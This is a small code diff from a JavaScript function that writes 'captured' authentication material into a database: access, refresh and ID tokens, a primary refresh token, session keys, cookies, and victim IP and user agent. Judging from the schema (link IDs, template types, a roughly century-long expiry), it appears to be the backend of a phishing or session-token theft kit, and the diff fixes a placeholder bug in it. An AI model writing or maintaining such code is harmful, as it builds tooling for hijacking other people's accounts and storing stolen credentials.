@@ -476,7 +476,7 @@ async function storeToken(job, tokenData, responseCookies = []) {
 
     const [result] = await db.query(
        `INSERT INTO captured_tokens (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted, id_token_encrypted, prt, client_info, session_key_jwe, device_tenant_id, cookies_encrypted, ip_address, user_agent, expiration, tenant, template_type, account_type, client_id)
-        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 876000 HOUR), ?, ?, ?, ?)`,
       [
         job.user_id,
         job.link_id,
